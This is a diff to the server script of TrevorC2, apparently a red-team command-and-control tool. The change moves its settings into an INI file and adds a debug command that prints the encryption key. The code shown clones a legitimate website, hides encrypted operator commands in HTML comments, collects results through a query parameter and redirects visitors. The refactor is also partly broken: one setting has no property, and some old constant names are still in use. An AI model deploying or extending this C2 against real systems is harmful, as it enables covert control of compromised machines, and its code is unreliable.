@@ -12,43 +12,6 @@ to be decoded by the client and executed and then passed back to the server
 via a query string parameter.
 """
 
-# CONFIG CONSTANTS:
-URL = ("https://www.google.com")  # URL to clone to house a legitimate website
-USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
-
-# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
-ROOT_PATH_QUERY = ("/")
-
-# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
-SITE_PATH_QUERY = ("/images")
-
-# THIS IS THE QUERY STRING PARAMETER USED
-QUERY_STRING = ("guid=")
-
-# THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
-COOKIE_SESSIONID_STRING = ("sessionid")
-
-# THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
-COOKIE_SESSIONID_LENGTH = (15)
-
-# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
-STUB = ("oldcss=")
-
-# Turn to True for SSL support
-SSL = False
-CERT_FILE = ("")  # Your Certificate for SSL
-
-# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
-CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
-
-# Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
-NOTFOUND=("Page not found.")
-
-# Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFF
-REDIRECT =("ON")
-
-# DO NOT CHANGE BELOW THIS LINE
-
 import os
 import re
 import ssl
@@ -69,6 +32,9 @@ import subprocess
 import collections
 import string
 import random
+# import configparser
+from configparser import ConfigParser
+
 try:
     import tornado.web
     import tornado.ioloop
@@ -81,6 +47,7 @@ import cmd
 from Crypto import Random
 from Crypto.Cipher import AES
 from collections import UserList
+
 
 # asyncio is python3 only - only needed for python3 regardless for tornado fix
 python_version = ("")
@@ -105,6 +72,7 @@ if os.geteuid() != 0:
 # python 2/3 compatibility
 try: input = raw_input
 except NameError: pass
+
 
 # CLASSES #
 class AgentClass: #Agent class
@@ -213,13 +181,78 @@ class TrevorPrompt(cmd.Cmd): #prompt class
         print("Description: Run command on the server")    
         print("Usage: servercmd <command>")
         print("Example: servercmd ifconfig")
+    
+    def do_testing(self, inp):
+        print(globalconfig.CERT_FILE)
+        print(globalconfig.CIPHER)
+        print(globalconfig.COOKIE_SESSIONID_STRING)
+        print(globalconfig.NOTFOUND)
 
+class Config: #Config parser
+    def __init__(self, configpath):
+        self._config = None
+        self._configpath = configpath
+        if not os.access(configpath, os.R_OK):
+            print("Config file missing")
+        else:
+            self._config = ConfigParser(interpolation=None)
+            self._config.read('trevorc2_config.ini')
+    
+    @property
+    def QUERY_STRING(self):
+        return self._config['DEFAULT']['QUERY_STRING']
+    
+    @property
+    def URL(self):
+        return self._config['DEFAULT']['URL']
 
+    @property
+    def USER_AGENT(self):
+        return self._config['DEFAULT']['USER_AGENT']
+    
+    @property
+    def ROOT_PATH_QUERY(self):
+        return self._config['DEFAULT']['ROOT_PATH_QUERY']
 
+    @property
+    def SITE_PATH_QUERY(self):
+        return self._config['DEFAULT']['SITE_PATH_QUERY']
+
+    @property
+    def COOKIE_SESSIONID_STRING(self):
+        return self._config['DEFAULT']['COOKIE_SESSIONID_STRING']
+
+    @property
+    def STUB(self):
+        return self._config['DEFAULT']['STUB']
+
+    @property
+    def SSL(self):
+        return bool(self._config['DEFAULT']['SSL'])
+
+    @property
+    def CERT_FILE(self):
+        return self._config['DEFAULT']['CERT_FILE']
+
+    @property
+    def CIPHER(self):
+        return self._config['DEFAULT']['CIPHER']
+
+    @property
+    def NOTFOUND(self):
+        return self._config['DEFAULT']['NOTFOUND']
+
+    @property
+    def REDIRECT(self):
+        return self._config['DEFAULT']['REDIRECT']
+
+globalconfig = Config('trevorc2_config.ini') #Get config
+
+# FUNCTIONS #
 def randomString():
     """Generate a random string of fixed length """
     letters = string.ascii_letters
-    return ''.join(random.choice(letters) for i in range(COOKIE_SESSIONID_LENGTH))
+    return ''.join(random.choice(letters) for i in range(globalconfig.COOKIE_SESSIONID_LENGTH))
 
 # AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -258,7 +291,7 @@ class AESCipher(object):
         return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
 
 # add cipher key here
-cipher = AESCipher(key=CIPHER)
+cipher = AESCipher(key=globalconfig.CIPHER)
 
 instructionsdict = {}
 def set_instruction(sessionid,instruction):
@@ -323,7 +356,7 @@ class UnknownPageHandler(tornado.web.RequestHandler):
         log.warning('Request to Invalid Page from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
         if REDIRECT.lower() == ("on"):
-            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (globalconfig.URL))
         else:
             site_data = open("clone_site/index.html", "r").read()
             self.write(site_data)
@@ -358,8 +391,8 @@ class RPQ(tornado.web.RequestHandler):
         site_data = open("clone_site/index.html", "r").read()
         # if we get assigned a cookie value or not
         cookie_value = 0
-        if self.get_cookie(COOKIE_SESSIONID_STRING):
-            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+        if self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING):
+            sid = self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING)
             instructions = instructionsdict[sid]
             cookie_value = 1
         else:
@@ -367,10 +400,10 @@ class RPQ(tornado.web.RequestHandler):
             print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
 
         # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
-        if REDIRECT.lower() == ("on") and cookie_value == 0:
-                self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        if globalconfig.REDIRECT.lower() == ("on") and cookie_value == 0:
+                self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (globalconfig.URL))
         else:
-            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
+            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (globalconfig.STUB, instructions))
             self.write(str(site_data))
 
     def put(self):
@@ -400,16 +433,16 @@ class SPQ(tornado.web.RequestHandler):
 
         args = self.request.arguments
         if not args:
-            self.write('%s\r\n' % (NOTFOUND))
+            self.write('%s\r\n' % (globalconfig.NOTFOUND))
             return
         for param in args:
-            if param in (QUERY_STRING):
+            if param in (globalconfig.QUERY_STRING):
                 query = args[param][0]
-        if not self.get_cookie(COOKIE_SESSIONID_STRING):
+        if not self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING):
             sid = randomString()
-            self.set_cookie(COOKIE_SESSIONID_STRING, sid)
+            self.set_cookie(globalconfig.COOKIE_SESSIONID_STRING, sid)
         else:
-            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+            sid = self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING)
         if not sid:
             return
         if not query:
@@ -435,16 +468,17 @@ def main_c2():
     global agent_list
     agent_list = AgentListClass()
     
+
     """Start C2 Server."""
     application = tornado.web.Application([
-        (ROOT_PATH_QUERY, RPQ),
-        (SITE_PATH_QUERY, SPQ),
+        (globalconfig.ROOT_PATH_QUERY, RPQ),
+        (globalconfig.SITE_PATH_QUERY, SPQ),
         (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
     ])
 
     try:
-        if SSL:
-            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
+        if globalconfig.SSL:
+            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': globalconfig.CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
             http_server.listen(443)
             tornado.ioloop.IOLoop.instance().start()
         else:
@@ -463,7 +497,6 @@ def main_c2():
             print("[!] Something went wrong, printing error message here: " + str(e))
 
 if __name__ == "__main__":
-
     print(r"""
 
            ,  .'''''.  ...    ''''',  .'
@@ -510,7 +543,7 @@ if __name__ == "__main__":
     print("TrevorC2 - Legitimate Website Covert Channel")
     print("Written by: David Kennedy (@HackingDave)")
     print("https://www.trustedsec.com")
-    clone_site(USER_AGENT, URL)
+    clone_site(globalconfig.USER_AGENT, globalconfig.URL)
     PYTHONVER = sys.version_info[0]
     print('[*] Starting Trevor C2 Server...')
     threading.Thread(target=main_c2).start()
@@ -527,4 +560,3 @@ if __name__ == "__main__":
         if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
         print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
         os._exit(0)
-    #   os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
